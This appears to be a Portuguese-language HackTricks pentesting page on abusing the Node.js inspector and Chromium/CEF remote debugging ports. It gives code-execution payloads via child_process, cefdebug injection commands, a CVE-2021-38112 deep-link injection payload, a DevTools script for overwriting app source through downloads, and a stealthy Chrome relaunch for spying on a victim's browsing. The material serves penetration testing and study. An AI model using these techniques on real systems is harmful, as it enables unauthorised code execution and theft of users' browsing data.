# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

Exemplos práticos históricos incluem o walkthrough do Multimaster e o ataque ao debugger do Visual Studio Code relacionado à CVE-2019-1414; use-os como contexto específico da versão, em vez de presumir que todo alvo atual Electron ou Chromium exponha as mesmas primitivas.<sup>[[1]](#references)[[3]](#references)</sup>

## Informações básicas

[Da documentação](https://nodejs.org/learn/getting-started/debugging): Quando iniciado com a opção `--inspect`, um processo Node.js escuta por um cliente de debugging. Por **padrão**, ele escutará no host e na porta **`127.0.0.1:9229`**. Cada processo também recebe um **UUID** **único**.<sup>[[4]](#references)</sup>

Os clientes do inspector precisam conhecer e especificar o endereço do host, a porta e o UUID para se conectar. Uma URL completa será semelhante a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Como o **debugger tem acesso total ao ambiente de execução do Node.js**, um agente malicioso capaz de se conectar a essa porta poderá conseguir executar código arbitrário em nome do processo Node.js (**potencial elevação de privilégios**).<sup>[[4]](#references)</sup>

Há várias maneiras de iniciar um inspector:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Ao iniciar um processo inspecionado, algo como isto aparecerá:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Processos baseados em **CEF** (**Chromium Embedded Framework**) podem expor um debugger com `--remote-debugging-port=9222`. Isso expõe o navegador por meio do [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) em vez de um inspetor do Node.js, portanto os payloads baseados em `process` do Node.js não são diretamente aplicáveis por padrão.<sup>[[2]](#references)[[5]](#references)</sup>

Ao iniciar um navegador em depuração, algo semelhante a isto será exibido:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets e same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Os websites abertos em um navegador web podem fazer solicitações WebSocket e HTTP de acordo com o modelo de segurança do navegador. Uma **conexão HTTP inicial** é necessária para **obter um ID de sessão exclusivo do debugger**. A **same-origin policy** **impede** que os websites possam fazer **essa conexão HTTP**. Para segurança adicional contra [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** o Node.js verifica se os **cabeçalhos 'Host'** da conexão especificam uma **faixa de IP** ou exatamente **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Essa **medida de segurança impede a exploração do inspector** para executar código **apenas enviando uma solicitação HTTP** (o que poderia ser feito explorando uma vulnerabilidade de SSRF).<sup>[[4]](#references)</sup>

### Iniciando o inspector em processos em execução

Você pode enviar o **sinal SIGUSR1** para um processo nodejs em execução para fazê-lo **iniciar o inspector** na porta padrão. No entanto, observe que você precisa ter privilégios suficientes; portanto, isso pode conceder **acesso privilegiado às informações dentro do processo**, mas não uma escalada direta de privilégios.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Isso é útil em containers porque **desligar o processo e iniciar um novo** com `--inspect` **não é uma opção**, pois o **container** será **encerrado** junto com o processo.<sup>[[6]](#references)</sup>

### Conectar ao inspector/debugger

Para conectar-se a um **navegador baseado em Chromium**, as URLs `chrome://inspect` ou `edge://inspect` podem ser acessadas no Chrome ou Edge, respectivamente. Ao clicar no botão Configure, deve-se garantir que o **host e a porta de destino** estejam listados corretamente. A imagem mostra um exemplo de Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Após uma URL para acessar o debugger aparecerá. ex.: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Conectar ao inspector/debugger: Para conectar-se a um navegador baseado em Chromium,...](<../../images/image (674).png>)

Usando a **linha de comando**, você pode conectar-se a um debugger/inspector com:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
A ferramenta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permite **encontrar inspectors** em execução localmente e **injetar código** neles.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Note que exploits de **RCE em NodeJS** não funcionarão se conectados a um navegador por meio do [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (é necessário verificar a API para encontrar coisas interessantes a fazer com ele).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE no Debugger/Inspector do NodeJS

> [!TIP]
> Se você chegou aqui procurando saber como obter [**RCE a partir de um XSS no Electron, verifique esta página.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Algumas formas comuns de obter **RCE** quando você pode **se conectar** a um **inspector** do Node é usando algo como (parece que isso **não funcionará em uma conexão com o Chrome DevTools protocol**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Você pode consultar a API aqui: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Nesta seção, vou apenas listar coisas interessantes que descobri que as pessoas usaram para explorar este protocolo.

### Parameter Injection via Deep Links

No [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), a Rhino Security descobriu que um aplicati**vo** baseado em CEF **registrou uma UR**I personalizada no sistema (workspaces://index.html), que recebia a URI completa e então **iniciava o aplicati**vo baseado em CEF com uma configuração parcialmente construída a partir dessa URI.<sup>[[8]](#references)</sup>

Foi descoberto que os parâmetros da URI eram decodificados como URL e usados para iniciar o aplicativo básico baseado em CEF, permitindo que um usuário **injetasse** a flag **`--gpu-launcher`** na **linha de comando** e executasse ações arbitrárias.<sup>[[8]](#references)</sup>

Assim, um payload como:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Executará um calc.exe.<sup>[[8]](#references)</sup>

### Sobrescrever Arquivos

Altere a pasta onde os **arquivos baixados serão salvos** e baixe um arquivo para **sobrescrever** o **código-fonte** frequentemente usado do aplicativo com seu **código malicioso**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### RCE e exfiltração via WebDriver

A STAR Labs mostrou que serviços WebDriver/CDP expostos podem permitir leituras arbitrárias de arquivos e RCE; o DNS rebinding pode completar a cadeia de exploração em algumas configurações.<sup>[[9]](#references)</sup>

Para obter mais informações sobre casos históricos de browser automation e segurança do Chromium, consulte o write-up do Counter WebDriver e os issues 773, 1742 e 1944 do Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

Em um ambiente real e **após comprometer** um PC de usuário que utiliza um browser baseado em Chrome/Chromium, você poderia iniciar um processo do Chrome com o **debugging ativado e fazer o port-forward da porta de debugging** para poder acessá-lo. Dessa forma, você poderá **inspecionar tudo o que a vítima faz com o Chrome e roubar informações sensíveis**.<sup>[[7]](#references)</sup>

A forma furtiva é **encerrar todos os processos do Chrome** e então chamar algo como:<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - ferramenta de inspeção e exploração do debugger CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Execução remota de código no Visual Studio Code via Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Guia de Debugging do Node.js - Primeiros passos](https://nodejs.org/learn/getting-started/debugging)
- [5] [Protocolo do Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Writeup do corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abusando do recurso de debugging do Chrome para observar e controlar sessões de navegação remotamente](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Execução remota de código no AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Você está falando comigo? - RCE via WebDriver usando DNS Rebinding e CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - De Bot a RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (rastreador de bugs do Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (rastreador de bugs do Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (rastreador de bugs do Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
